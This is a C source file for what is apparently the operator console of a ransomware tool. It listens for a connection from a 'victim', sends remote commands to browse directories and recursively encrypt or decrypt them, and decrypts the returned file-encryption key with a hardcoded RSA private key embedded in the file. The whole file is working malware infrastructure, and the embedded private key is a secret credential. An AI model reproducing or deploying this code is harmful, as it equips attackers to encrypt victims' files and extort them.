#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>

char privateKey[] = "-----BEGIN RSA PRIVATE KEY-----\n"\
"MIIEpAIBAAKCAQEAuaSs3J+sdyTWIGiYOuWePVjbJoI42eUzHrJpAuVhwaHsVREK\n"\
"dFSYG4LP7SdFLtAQxSDQYBqwe5gLfJk/E89jcWnhDL5Kqnz4ihyfyk31zJxEdzjx\n"\
"ccs7LTiXY5IuFPsOpxZJjf5xPIopqjiBcbxi+/+jTWfG5xT8gh8PbqpRnVi5/qQq\n"\
"D/4tXkCXeNsJ4yJSFOymhmTieclXkDakPzQJ2jLnBUA0pEeDBoeVMKLsib+FPdC6\n"\
"BN/hVT4n56xvln7J1tbtMM/ujT1mH/KKndgAxqd8R5PZRhudSQGNg6UrhmlsmS1O\n"\
"UdmB+/9eOHVGeLeIZHNcHyc9n5OQ+W7CpZ0p+wIDAQABAoIBAHd+D+ZSwOhPxaRG\n"\
"rvX6JsjGEQnQeFeIuEbh/8Xlb+77EuwOc/Q9H0tWABBeXqGrO6AnZvj1NPPZAkvJ\n"\
"OFi//PpbdIiHU/g5SKFdm1zUoYp6a3dyJ7dfYU/SRV/KD+9hSiUyq1XCmZCmPftb\n"\
"M7bJ08zw12RTkCvdzkrTQ1OwPahRAozyB5rk4icdsE7jhx2x9z5FZSJqP6xMFpxm\n"\
"Hyz67P4/MJvTvSqXqox82n1A/aZqlIdPaMHnOyEfsPEt0QF9wdoU7A4pRww/IIhU\n"\
"0gM3xfy4eTU1sgiV2LQC/VDFtzYAt86aXHzBM9PW3yxrcER2sqizxlZjekRM7vSZ\n"\
"xsjKnQECgYEA7McYkSlqvFui6e6SiMfWtElG/FfaIIcDKlEJVeKdk+33d23vESEl\n"\
"S1hvrCfAB5IFl26bCKT7GR25jcxWmsT9goxdLp1t8LmihUu9PKdlFsLXXWQATVWg\n"\
"F8tmFh+83R/eCPp/M9uLtcUc27LEY1GtbaBA8mrUWf47tQh6wkMMhUsCgYEAyLbc\n"\
"sgTwxV1Oi9G5cSBi8Ed30EtJcj1GO18kZl/sxOe9gZWjz99AMJEQiXohaH24gM4R\n"\
"t62SjsfvTPTwvRT+870bkf0jn2nTzCZ3doBE7kKMQu0yHOry2Pvo8V8hmCw8wLFb\n"\
"vsIOACGnBM7vlZ64NRVt5Dq+29Cu/DeWeaU28BECgYEAiFuITGDbtSnYwnvAK8Fa\n"\
"Zm0k0kINvlnCeuY8SBe/w+dxcnf/C5BZF/EQLsadkj6HtdPeuLW6XZZ+u6iH342+\n"\
"qSYIq8XCALYHYFhj3MBSOS9wM7pZai/7iHh8jBUvAPFPP0BzbPvsk3u2yNdEviXV\n"\
"iKKXhIP9Uu5UmEcP2zwdw80CgYBgSRDAOYyDMYqvmlFaio3L9IzumF9IdUqOysp8\n"\
"bgH4R69qTa3C17dEVSLYwITsSntLFw/6zEJlSlZq1YnzOvI/XPWv5/7Bx5O5+K4Q\n"\
"Y+ItZjFBHeaPZspO+zG5MMi95mLSkYKQlSkAOSSVMuxOG1EE7h3EgcXzTz3Scpw2\n"\
"COK88QKBgQClG5+DJwSiI69nb3ctZzE1MbUBSiaHnHyyGTvgmp1dcQmF3z1w5fUJ\n"\
"mZZ2OPcbdzFlnpU1USqP067vNHATCMs0OZ9E8fQqyzNyscYHgG0LHxb26C9hcad7\n"\
"pxUG6jOmqnvIEHWQI1U043jJ84HsO8KmL5dFqFh+hyrJilivaHUj2g==\n"\
"-----END RSA PRIVATE KEY-----\n";

char publicKey[] = "-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuaSs3J+sdyTWIGiYOuWe\n"\
"PVjbJoI42eUzHrJpAuVhwaHsVREKdFSYG4LP7SdFLtAQxSDQYBqwe5gLfJk/E89j\n"\
"cWnhDL5Kqnz4ihyfyk31zJxEdzjxccs7LTiXY5IuFPsOpxZJjf5xPIopqjiBcbxi\n"\
"+/+jTWfG5xT8gh8PbqpRnVi5/qQqD/4tXkCXeNsJ4yJSFOymhmTieclXkDakPzQJ\n"\
"2jLnBUA0pEeDBoeVMKLsib+FPdC6BN/hVT4n56xvln7J1tbtMM/ujT1mH/KKndgA\n"\
"xqd8R5PZRhudSQGNg6UrhmlsmS1OUdmB+/9eOHVGeLeIZHNcHyc9n5OQ+W7CpZ0p\n"\
"+wIDAQAB\n"\
"-----END PUBLIC KEY-----\n";

int padding = RSA_PKCS1_PADDING;

RSA * createRSA(unsigned char * key, int public); //Create RSA structure used for encryption and decryption
int private_decrypt(unsigned char * encdata, int data_len, unsigned char * key, unsigned char *decrypted);
void usage();
int command_handler(char * command, int sockid, int client_socket);
void handleError(int sockid);

int main()
{
    unsigned char  encrypted[4098]={};
    unsigned char decrypted[4098]={};
    int sockid;
    int server_port = 8888;
    char *server_ip = "10.0.0.2";

    if ((sockid = socket(AF_INET, SOCK_STREAM,0))<0) 
    {
        printf("Error when creating socket\n");
        abort();
    }

    struct sockaddr_in server_addr, client_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    int n, len, client_socket;
    char buffer[2048];

    if (bind(sockid, (const struct sockaddr *)&server_addr, sizeof(server_addr))<0)
    {
        printf("Error during binding\n");
        printf("%s\n", strerror(errno));
        handleError(sockid);
    }

    printf("Waiting for connection...\n");
    if (listen(sockid,1)<0)
    {
        printf("Error when listening\n");
        handleError(sockid);
    }
    len = sizeof(client_addr);
    if ((client_socket = accept(sockid, (struct sockaddr *)&client_addr, &len))<0)
    {
        printf("Error when accepting connection\n");
        handleError(sockid);
    }

    printf("Connected to a victim\n");

    

    //n = recv(client_socket, (char *)buffer, 2048, MSG_WAITALL );
    while (1) 
    {
        char command[512];
        printf("h for help\n");
        printf("$ ");
        fgets(command,512,stdin);
        command_handler(command, sockid, client_socket);

    }   
}


void usage() 
{
    printf("h : prints help\n");
    printf("ls : list every directories of the victim's home directory\n");
    printf("enc : recursively encrypt a directory that you are in\n");
    printf("dec <key> <iv> : recursively decrypt the directory that you are in\n");
    printf("pwd : print the current working directory\n");
    printf("cd <directory> : change directory to specified directory\n");
    printf("clear : clear the terminal\n");
    printf("exit : exit the programm and close the ransomware agent\n");

}

int command_handler(char * command,int sockid, int client_socket)
{

    if (strncmp(command,"h",1) == 0 && strlen(command) == 2)
    {
        usage();
    }
    else if(strncmp(command,"ls",2) == 0 && strlen(command)==3)
    {   
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            printf("%s\n", strerror(errno));
            handleError(sockid);
        }

        printf("%s\n", buffer);
    }
    else if (strncmp(command,"enc",3) == 0 && strlen(command) == 4)
    {
        char buffer[2048];
        int status;
        unsigned char decrypted[4098]={};
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        int lenght = private_decrypt(buffer, 256, privateKey, decrypted);
        if (lenght == -1) 
        {
            printf("Error during encryption\n");
        }
        else 
        {
            printf("%s\n", decrypted);
        }

    }
    else if (strncmp(command,"dec",3) == 0)
    {
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"cd ",3) == 0)
    {
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"pwd",3) == 0 && strlen(command) == 4)
    {
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"clear",5 ) == 0 && strlen(command) == 6)
    {
        system("/bin/clear"); 
    }
    else if (strncmp(command,"exit",4) == 0 && strlen(command) == 5)  
    {
        close(sockid);
        exit(0);
    }
    else if (strncmp(command, "cd", 2) ==0 && strlen(command) == 3)
    {
        printf("Usage : cd <directory>\n");
    }
    else 
    {
        printf("command not found type h for help\n");
    }

}

void handleError(int sockid)
{
    close(sockid);
    abort();
}

RSA * createRSA(unsigned char * key,int public)
{
    RSA *rsa= NULL;
    BIO *keybio ;
    keybio = BIO_new_mem_buf(key, -1);
    if (keybio==NULL)
    {
        printf( "Failed to create key BIO");
        return 0;
    }
    if(public)
    {
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
    }
    else
    {
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa,NULL, NULL);
    }
    if(rsa == NULL)
    {
        printf( "Failed to create RSA");
    }
 
    return rsa;
}

int public_encrypt(unsigned char * data,int data_len,unsigned char * key, unsigned char *encrypted)
{
    RSA * rsa = createRSA(key,1);
    int result = RSA_public_encrypt(data_len,data,encrypted,rsa,padding);
    return result;
}

int private_decrypt(unsigned char * enc_data,int data_len,unsigned char * key, unsigned char *decrypted)
{
    RSA * rsa = createRSA(key,0);
    int  result = RSA_private_decrypt(data_len,enc_data,decrypted,rsa,padding);
    return result;
}
